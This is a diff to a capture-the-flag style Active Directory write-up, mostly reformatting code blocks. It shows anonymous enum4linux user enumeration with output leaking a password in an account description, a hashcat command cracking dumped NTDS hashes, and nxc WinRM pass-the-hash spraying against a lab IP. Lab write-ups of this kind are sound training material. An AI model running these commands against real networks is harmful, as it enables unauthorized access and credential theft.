@@ -36,7 +36,8 @@ When attempting the same enumeration with enum4linux, which automatically dumps 
 enum4linux -a -u "" -p "" 192.168.154.175 && enum4linux -a -u "guest" -p "" 192.168.154.175
 ```
 
-```index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain                                                                                                
+```
+index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain                                                                                                
 index: 0xf72 RID: 0x457 acb: 0x00020010 Account: D.Durant       Name: (null)    Desc: Linear Algebra and crypto god                                                                                                                         
 index: 0xf73 RID: 0x458 acb: 0x00020010 Account: G.Goldberg     Name: (null)    Desc: Blockchain expert                                                                                                                                     
 index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain                                                                                                      
@@ -48,20 +49,21 @@ index: 0xf6a RID: 0x44f acb: 0x00020010 Account: M.Mason        Name: (null)    
 index: 0xf70 RID: 0x455 acb: 0x00020010 Account: P.Parker       Name: (null)    Desc: Backend Developer                                                                                                                                     
 index: 0xf71 RID: 0x456 acb: 0x00020010 Account: R.Robinson     Name: (null)    Desc: Database Admin                                                                                                                                        
 index: 0xf6f RID: 0x454 acb: 0x00020010 Account: S.Swanson      Name: (null)    Desc: Military Vet now cybersecurity specialist                                               index: 0xf6e RID: 0x453 acb: 0x00000210 Account: V.Ventz        Name: (null)    Desc: New-hired, reminder: HotelCalifornia194!                                                                                                              
-user:[Administrator] rid:[0x1f4]                                                                                                                                                                                                            
-user:[Guest] rid:[0x1f5]                                                                                                                                                                                                                    
-user:[krbtgt] rid:[0x1f6]                                                                                                                                                                                                                   
-user:[M.Mason] rid:[0x44f]                                                                                                                                                                                                                  
-user:[K.Keen] rid:[0x450]                                                                                                                                                                                                                   
-user:[L.Livingstone] rid:[0x451]                                                                                                                                                                                                            
-user:[J.Johnson] rid:[0x452]                                                                                                                                                                                                                
-user:[V.Ventz] rid:[0x453]                                                                                                                                                                                                                  
-user:[S.Swanson] rid:[0x454]                                                                                                                                                                                                                
-user:[P.Parker] rid:[0x455]                                                                                                                                                                                                                 
-user:[R.Robinson] rid:[0x456]                                                                                                                                                                                                               
-user:[D.Durant] rid:[0x457]                                                                                                                                                                                                                 
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[M.Mason] rid:[0x44f]
+user:[K.Keen] rid:[0x450]
+user:[L.Livingstone] rid:[0x451]
+user:[J.Johnson] rid:[0x452]
+user:[V.Ventz] rid:[0x453]
+user:[S.Swanson] rid:[0x454]
+user:[P.Parker] rid:[0x455]
+user:[R.Robinson] rid:[0x456]
+user:[D.Durant] rid:[0x457]
 user:[G.Goldberg] rid:[0x458] 
 ```
+
 
 ![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241025120730.png?raw=true)
 
@@ -78,6 +80,7 @@ We can try to decrypt them with hashcat but it will not work:
 hashcat -m 1000 -w 3 -a 0 -p : --session=all — username -o ./cracked.out --outfile-format=3 ./secrets.dump.ntds /usr/share/wordlists/rockyou.txt --potfile-path ./hashcat.pot
 ```
 ## WINRM
+
 With nxc we can spray the obtained hashes with the previous obtained users to see if any of them matches:
 ```
 nxc winrm 192.168.154.175 -u users.txt -H hashes.txt
